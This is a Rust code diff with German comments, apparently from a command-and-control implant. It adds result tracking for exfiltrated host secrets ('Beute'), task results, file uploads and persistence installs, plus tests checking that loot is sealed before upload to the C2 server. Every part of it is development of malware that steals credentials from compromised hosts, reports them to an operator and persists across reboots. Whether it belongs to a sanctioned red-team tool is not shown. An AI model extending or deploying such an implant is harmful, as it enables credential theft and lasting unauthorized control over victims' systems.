@@ -69,6 +69,22 @@ pub struct Ergebnis {
     /// dem Ziel, kein Übertragungsproblem zum C2. Der Operator handelt
     /// unterschiedlich: hier lohnt ein Blick auf die Rechte auf dem Ziel.
     pub beute_nicht_extrahiert: usize,
+    /// Die Task-Ergebnisse, die der Server nicht angenommen hat.
+    ///
+    /// Ein ausgeführtes Kommando, dessen Ergebnis den Operator nicht
+    /// erreicht, ist verlorene Arbeit — der Lauf darf nicht als Erfolg
+    /// gelten (Issue #69).
+    pub tasks_verloren: usize,
+    /// Ob die Persistenz-Installation fehlgeschlagen ist.
+    ///
+    /// Ohne Persistenz überlebt der Agent keinen Neustart — das ist ein
+    /// Fehlschlag des Laufs, keine Fußnote im Log (Issue #69).
+    pub persistenz_fehlgeschlagen: bool,
+    /// Die Datei-Container, die der Server angenommen hat (Issue #31).
+    pub dateien_uebertragen: usize,
+    /// Die Dateien, die nicht ankamen — nicht lesbar, nicht versiegelbar
+    /// oder vom C2 abgewiesen. Wie verlorene Beute: verlorene Arbeit.
+    pub dateien_verloren: usize,
 }
 
 impl Ergebnis {
@@ -84,15 +100,24 @@ impl Ergebnis {
 
     /// Ob der Lauf als Fehlschlag zu melden ist.
     ///
-    /// **Jede** verlorene Host-Anmeldung und jede verlorene Beute ist ein
-    /// Fehlschlag. Das umfasst die eigene Anmeldung des Agenten: der
-    /// C2-Server kennt den Agenten sonst nicht, und der Operator sieht ihn
-    /// nicht in seiner Host-Liste.
+    /// **Jede** verlorene Host-Anmeldung, jede verlorene Beute und jede
+    /// fehlgeschlagene Extraktion ist ein Fehlschlag. Das umfasst die eigene
+    /// Anmeldung des Agenten: der C2-Server kennt den Agenten sonst nicht, und
+    /// der Operator sieht ihn nicht in seiner Host-Liste. Eine Quelle, die
+    /// nicht lesbar war, zaehlt ebenso: der Betreiber soll keinen Erfolg
+    /// sehen, wenn die Extraktion auf diesem Host kaputt war (Issue #71).
     ///
     /// Ein gescheiterter Exploit ist **kein** Fehlschlag — nichts gefunden ist
-    /// ein Ergebnis.
+    /// ein Ergebnis. Eine Quelle, die nicht existiert oder dem Agenten ohne
+    /// Root-Rechte gehoert, ist ebenfalls keiner — die Extraktoren melden sie
+    /// als leeren Fund, nicht als Fehler.
     pub fn fehlgeschlagen(&self) -> bool {
-        self.hosts_verloren > 0 || self.beute_verloren > 0
+        self.hosts_verloren > 0
+            || self.beute_verloren > 0
+            || self.beute_nicht_extrahiert > 0
+            || self.tasks_verloren > 0
+            || self.dateien_verloren > 0
+            || self.persistenz_fehlgeschlagen
     }
 
     /// Zwei Ergebnisse zu einem zusammenführen.
@@ -107,6 +132,11 @@ impl Ergebnis {
             beute_uebertragen: self.beute_uebertragen + andere.beute_uebertragen,
             beute_verloren: self.beute_verloren + andere.beute_verloren,
             beute_nicht_extrahiert: self.beute_nicht_extrahiert + andere.beute_nicht_extrahiert,
+            tasks_verloren: self.tasks_verloren + andere.tasks_verloren,
+            dateien_uebertragen: self.dateien_uebertragen + andere.dateien_uebertragen,
+            dateien_verloren: self.dateien_verloren + andere.dateien_verloren,
+            persistenz_fehlgeschlagen: self.persistenz_fehlgeschlagen
+                || andere.persistenz_fehlgeschlagen,
         }
     }
 }
@@ -187,31 +217,48 @@ pub fn melde(port: &dyn C2Port, sealer: Option<&KeySealer>, funde: &[HostFund]) 
         if beute_verweigert {
             continue;
         }
-        for secret in &fund.secrets {
-            let upload = match kx_core::exfil::upload(
-                secret,
-                key.as_ref().map(|k| k.roh.as_slice()),
-                key.as_ref().map(|k| k.sealed_master.as_str()),
-                &fund.host_id,
-            ) {
-                Ok(upload) => upload,
-                Err(e) => {
-                    // Der Klartext geht nicht als Ersatz raus — das Stück bleibt.
-                    error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
-                    ergebnis.beute_verloren += 1;
-                    continue;
-                }
-            };
-            match port.melde_beute(&upload) {
-                Ok(()) => ergebnis.beute_uebertragen += 1,
-                Err(e) => {
-                    error!("Beute nicht gemeldet: {e}");
-                    ergebnis.beute_verloren += 1;
-                }
+        ergebnis = ergebnis.zusammenfuehren(melde_beute_eines_hosts(
+            port,
+            key.as_ref().map(|k| k.roh.as_slice()),
+            key.as_ref().map(|k| k.sealed_master.as_str()),
+            &fund,
+        ));
+    }
+
+    ergebnis
+}
+
+/// Meldet die Beute **eines** Hosts, dessen Registrierung schon gelang.
+///
+/// Der Master-Key kommt als Scheibe herein, nicht als `SealedHostKey`: so ist
+/// der Zweig „das Stück ist nicht versiegelbar" auch im Test erreichbar —
+/// mit einer falschen Schlüssellänge, wie sie `exfil::upload` ablehnt.
+fn melde_beute_eines_hosts(
+    port: &dyn C2Port,
+    master_key: Option<&[u8]>,
+    sealed_master: Option<&str>,
+    fund: &HostFund,
+) -> Ergebnis {
+    let mut ergebnis = Ergebnis::default();
+    for secret in &fund.secrets {
+        let upload = match kx_core::exfil::upload(secret, master_key, sealed_master, &fund.host_id)
+        {
+            Ok(upload) => upload,
+            Err(e) => {
+                // Der Klartext geht nicht als Ersatz raus — das Stück bleibt.
+                error!("Beute nicht versiegelbar, sie bleibt hier: {e}");
+                ergebnis.beute_verloren += 1;
+                continue;
+            }
+        };
+        match port.melde_beute(&upload) {
+            Ok(()) => ergebnis.beute_uebertragen += 1,
+            Err(e) => {
+                error!("Beute nicht gemeldet: {e}");
+                ergebnis.beute_verloren += 1;
             }
         }
     }
-
     ergebnis
 }
 
@@ -322,6 +369,14 @@ mod tests {
             &self,
             _report: &kx_core::c2::TaskResultRequest,
         ) -> Result<(), TransportError> {
+            Ok(())
+        }
+
+        fn melde_datei(&self, upload: &kx_core::c2::FileUpload) -> Result<(), TransportError> {
+            self.aufrufe
+                .lock()
+                .unwrap()
+                .push(format!("datei:{}", upload.host_id));
             Ok(())
         }
     }
@@ -541,6 +596,133 @@ mod tests {
         let port = Aufzeichner::neu();
         melde(&port, None, &[fund("192.168.1.5", 1)]);
         assert_eq!(port.aufrufe().len(), 2, "Host und Beute");
+        let uploads = port.uploads();
+        assert_eq!(uploads.len(), 1);
+        assert_eq!(
+            uploads[0].password, "hash",
+            "ohne Server-Schlüssel muss das Passwort im Klartextfeld stehen"
+        );
+        assert!(
+            uploads[0].sealed_password.is_none(),
+            "ohne Schlüssel darf nichts versiegelt sein"
+        );
+    }
+
+    /// Der Master-Key selbst verlässt den Agenten nie — weder in der
+    /// Registrierung noch in einem Beute-Upload. Der Server bekommt nur das
+    /// versiegelte Material (Issue #69).
+    #[test]
+    fn der_master_key_selbst_verlaesst_den_agenten_nie() {
+        let port = Aufzeichner::neu();
+        let sealer = gueltiger_sealer();
+        let fund = fund("192.168.1.5", 2);
+        let key = sealer
+            .schluessel_fuer(&fund.host_id)
+            .expect("Schlüsselmaterial");
+        let ergebnis = melde(&port, Some(&sealer), &[fund]);
+        assert_eq!(ergebnis.beute_uebertragen, 2);
+
+        for host in port.hosts() {
+            assert!(
+                host.master_key.is_none(),
+                "der Master-Key steht in der Registrierung"
+            );
+        }
+        for upload in port.uploads() {
+            assert!(
+                upload.master_key.is_none(),
+                "der Master-Key steht im Beute-Upload"
+            );
+        }
+        // Der Rohschlüssel darf auch nicht base64-kodiert irgendwo auftauchen.
+        let roh_b64 = kx_core::codec::b64_encode(&key.roh);
+        let draht = serde_json::to_string(&(port.hosts(), port.uploads())).expect("JSON");
+        assert!(
+            !draht.contains(&roh_b64),
+            "der Rohschlüssel steht auf der Leitung"
+        );
+    }
+
+    /// Ein Stück, das nicht versiegelbar ist, bleibt beim Agenten und zählt
+    /// als verloren — der Klartext geht nicht als Ersatz raus (Issue #69).
+    ///
+    /// Der Zweig liegt in `melde_beute_eines_hosts`: eine falsche
+    /// Schlüssellänge lässt `exfil::upload` fehlschlagen, genau wie ein
+    /// Kryptografiefehler im Betrieb.
+    #[test]
+    fn ein_nicht_versiegelbares_stueck_bleibt_hier_und_zaehlt_als_verloren() {
+        let port = Aufzeichner::neu();
+        let fund = fund("192.168.1.5", 2);
+        let ergebnis = melde_beute_eines_hosts(&port, Some(&[0u8; 4]), None, &fund);
+
+        assert!(
+            port.uploads().is_empty(),
+            "das Stück ging trotz Versiegelungsfehler raus"
+        );
+        assert_eq!(ergebnis.beute_uebertragen, 0);
+        assert_eq!(ergebnis.beute_verloren, 2);
+        assert!(ergebnis.fehlgeschlagen());
+    }
+
+    /// `kein_host_angekommen()` ist positiv belegt: kein Host registriert,
+    /// mindestens einer verloren (Issue #69).
+    #[test]
+    fn kein_host_angekommen_ist_positiv_geprueft() {
+        let port = Aufzeichner::mit_host_fehler();
+        let ergebnis = melde(&port, None, &[fund("192.168.1.5", 1)]);
+        assert!(
+            ergebnis.kein_host_angekommen(),
+            "kein Host kam an — das muss der Zugriff erkennen"
+        );
+
+        // Gegenprobe: kommt ein Host an, ist die Aussage falsch — auch wenn
+        // ein anderer verloren ging.
+        let gemischt = Ergebnis {
+            hosts_registriert: 1,
+            hosts_verloren: 1,
+            ..Default::default()
+        };
+        assert!(!gemischt.kein_host_angekommen());
+        assert!(!Ergebnis::default().kein_host_angekommen());
+    }
+
+    /// Eine fehlgeschlagene Persistenz ist ein Fehlschlag des Laufs — ohne
+    /// sie überlebt der Agent keinen Neustart (Issue #69).
+    #[test]
+    fn eine_fehlgeschlagene_persistenz_ist_ein_fehlschlag() {
+        let ergebnis = Ergebnis {
+            hosts_registriert: 1,
+            persistenz_fehlgeschlagen: true,
+            ..Default::default()
+        };
+        assert!(ergebnis.fehlgeschlagen());
+        assert!(
+            ergebnis
+                .zusammenfuehren(Ergebnis::default())
+                .fehlgeschlagen(),
+            "das Merkmal ging beim Zusammenführen verloren"
+        );
+    }
+
+    /// Ein Task-Ergebnis, das den Operator nicht erreicht, ist verlorene
+    /// Arbeit und macht den Lauf zum Fehlschlag (Issue #69).
+    #[test]
+    fn ein_verlorenes_task_ergebnis_ist_ein_fehlschlag() {
+        let ergebnis = Ergebnis {
+            hosts_registriert: 1,
+            tasks_verloren: 1,
+            ..Default::default()
+        };
+        assert!(ergebnis.fehlgeschlagen());
+        assert_eq!(
+            ergebnis
+                .zusammenfuehren(Ergebnis {
+                    tasks_verloren: 2,
+                    ..Default::default()
+                })
+                .tasks_verloren,
+            3
+        );
     }
 
     #[test]
@@ -551,6 +733,7 @@ mod tests {
             beute_uebertragen: 2,
             beute_verloren: 1,
             beute_nicht_extrahiert: 0,
+            ..Default::default()
         };
         let zweite = Ergebnis {
             hosts_registriert: 3,
@@ -558,6 +741,7 @@ mod tests {
             beute_uebertragen: 5,
             beute_verloren: 0,
             beute_nicht_extrahiert: 0,
+            ..Default::default()
         };
         let gesamt = erste.zusammenfuehren(zweite);
 
